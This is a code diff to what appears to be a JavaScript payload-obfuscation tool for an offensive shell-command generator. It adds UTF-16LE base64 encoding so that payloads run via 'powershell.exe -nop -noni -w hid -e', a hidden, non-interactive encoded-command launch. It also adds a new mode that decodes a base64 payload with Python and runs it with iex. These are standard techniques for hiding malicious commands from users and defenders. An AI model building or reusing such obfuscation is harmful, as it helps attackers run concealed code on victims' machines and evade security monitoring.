@@ -15,6 +15,10 @@ function updateSelectBinElem(optPurpose) {
 }
 
 function toBase64(str) {
+    return btoa(str);
+}
+
+function toBase64UTF16LE(str) {
     // Convert str to UTF-16LE
     const utf16leBytes = [];
     for (let i = 0; i < str.length; i++) {
@@ -95,9 +99,17 @@ async function obfsAesGcm(payload, cli) {
 function obfsBase64(payload, cli) {
     if (cli === 'Command Prompt') {
         // return '# No available on Command Prompt';
-        return `powershell.exe -nop -noni -w hid -e ${toBase64(payload)}`;
+        return `powershell.exe -nop -noni -w hid -e ${toBase64UTF16LE(payload)}`;
     } else {
-        return `powershell.exe -nop -noni -w hid -e ${toBase64(payload)}`;
+        return `powershell.exe -nop -noni -w hid -e ${toBase64UTF16LE(payload)}`;
+    }
+}
+
+function obfsBase64Python(payload, cli) {
+    if (cli == 'Command Prompt') {
+        return `# No available on Command Prompt`;
+    } else {
+        return `iex $(python3 -c "import base64;print(base64.b64decode('${toBase64(payload)}').decode())")`;
     }
 }
 
@@ -130,6 +142,8 @@ async function obfs(payload, cli, optObfs) {
             return await obfsAesGcm(payload, cli);
         case 'Base64':
             return obfsBase64(payload, cli);
+        case 'Base64 (Python)':
+            return obfsBase64Python(payload, cli);
         case 'Split':
             return obfsSplit(payload, cli);
         default:
